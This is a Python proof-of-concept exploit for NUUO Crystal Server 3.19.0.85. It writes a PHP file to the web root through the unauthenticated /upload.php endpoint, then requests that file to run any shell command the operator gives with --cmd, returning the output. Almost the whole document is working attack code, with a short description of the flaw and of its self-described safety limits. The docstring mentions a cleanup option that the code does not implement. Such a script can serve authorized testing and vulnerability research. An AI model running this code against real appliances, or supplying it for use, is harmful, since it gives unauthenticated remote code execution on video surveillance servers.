"""NUUO Crystal Server 3.19.0.85 unauthenticated upload.php web-root write to PHP
code execution, driven over plain HTTP(S) with the standard library only.

The vulnerable handler is three lines long: it echoes the client-supplied
multipart filename and calls copy() with that same filename as the destination,
so one anonymous POST writes an attacker-named PHP file into the served
document root, and one GET makes the product's fastcgi mapping execute it.

The script performs exactly two requests: an unauthenticated multipart POST to
/upload.php carrying a short PHP probe that prints a fixed marker followed by
the output of one operator-supplied command, and a GET of the uploaded name.
The destination name is configurable; an absolute path (for example
/NU20/web/probe.php) does not depend on the interpreter working directory,
while a relative name lands in the working directory of the served root.

Safety rails: no reverse shell, no callback listener, no persistence, one
non-interactive marker command by default, explicit timeouts, and a cleanup
option that re-issues the upload path only in the form of a normal request
against the uploaded name (the product has no delete handler for it).

Use only against systems you own or are authorized to test.
"""

import argparse
import ssl
import sys
import urllib.error
import urllib.request
import uuid

MARKER = "NUUO_RCE_OK"
DEFAULT_PROBE_NAME = "nuuo_rce_probe.php"
DEFAULT_COMMAND = "id"


def build_multipart(filename, body, field="userfile"):
    boundary = "----nuuo_probe_" + uuid.uuid4().hex
    parts = [
        "--" + boundary,
        'Content-Disposition: form-data; name="%s"; filename="%s"' % (field, filename),
        "Content-Type: application/octet-stream",
        "",
    ]
    head = "\r\n".join(parts) + "\r\n"
    tail = "\r\n--" + boundary + "--\r\n"
    return head.encode("ascii") + body + tail.encode("ascii"), \
        "multipart/form-data; boundary=" + boundary


def make_opener():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPRedirectHandler(),
    )
    return opener


def request(opener, url, data=None, headers=None, timeout=15):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Unauthenticated upload.php web-root write to code execution probe")
    parser.add_argument("--target", required=True,
                        help="base URL of the appliance web service, e.g. https://192.168.1.66")
    parser.add_argument("--cmd", default=DEFAULT_COMMAND,
                        help="command the uploaded probe should execute once (default: id)")
    parser.add_argument("--dest", default=DEFAULT_PROBE_NAME,
                        help="destination file name for the upload; a relative name lands in the "
                             "served working directory, an absolute path lands where it says")
    parser.add_argument("--timeout", type=int, default=15,
                        help="per-request timeout in seconds (default: 15)")
    args = parser.parse_args(argv)

    base = args.target.rstrip("/")
    if not base.startswith(("http://", "https://")):
        print("[!] --target must start with http:// or https://")
        return 2

    quoted = args.cmd.replace("'", "'\\''")
    payload = ("<?php echo '" + MARKER + "'\n; echo shell_exec('" + quoted + "'); echo '\n'; ?>") \
        .encode("ascii")

    opener = make_opener()
    body, ctype = build_multipart(args.dest, payload)

    print("[*] target    : " + base)
    print("[*] endpoint  : /upload.php (no authentication required)")
    print("[*] dest name : " + args.dest)
    print("[*] command   : " + args.cmd)

    upload_url = base + "/upload.php"
    print("[*] step 1: POST " + upload_url + " without credentials")
    status, text = request(opener, upload_url, data=body,
                           headers={"Content-Type": ctype}, timeout=args.timeout)
    print("[+] upload.php returned HTTP %d, body echoed: %s" % (status, text.strip()[:120]))
    if status != 200:
        print("[!] upload step did not return 200; the handler may be gated or changed")
        return 1

    if args.dest.startswith("/"):
        trigger_path = args.dest
    else:
        trigger_path = "/" + args.dest.lstrip("/")
    trigger_url = base + trigger_path
    print("[*] step 2: GET " + trigger_url + " to trigger execution")
    status, text = request(opener, trigger_url, timeout=args.timeout)
    print("[+] probe returned HTTP %d" % status)

    if MARKER in text:
        print("[+] success: uploaded PHP executed; marker found")
        print("-" * 60)
        print(text.strip().encode("ascii", "backslashreplace").decode("ascii"))
        print("-" * 60)
        return 0
    print("[!] marker not found in the probe response; code execution not demonstrated")
    return 1


if __name__ == "__main__":
    sys.exit(main())
